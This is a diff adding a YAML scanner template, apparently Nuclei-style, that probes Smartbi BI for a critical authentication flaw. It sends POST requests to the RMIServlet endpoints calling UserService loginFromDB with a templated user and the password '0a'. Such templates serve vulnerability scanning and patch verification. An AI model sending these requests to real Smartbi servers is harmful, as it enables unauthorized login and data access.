@@ -1,0 +1,26 @@
+id: yaml-poc-smartbi-smartbi_bi-idor-CT-765607
+info:
+  name: Yaml Poc Smartbi Smartbi_Bi Idor Ct 765607
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-smartbi-smartbi_bi-idor-CT-765607'
+  tags: xpoc
+  reference:
+  - https://www.smartbi.com.cn/patchinfo
+http:
+- method: POST
+  path:
+  - /smartbi/vision/RMIServlet
+  body: 'className=UserService&methodName=loginFromDB&params=["{{value}}","0a"]
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+- method: POST
+  path:
+  - /vision/RMIServlet
+  body: 'className=UserService&methodName=loginFromDB&params=["{{value}}","0a"]
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
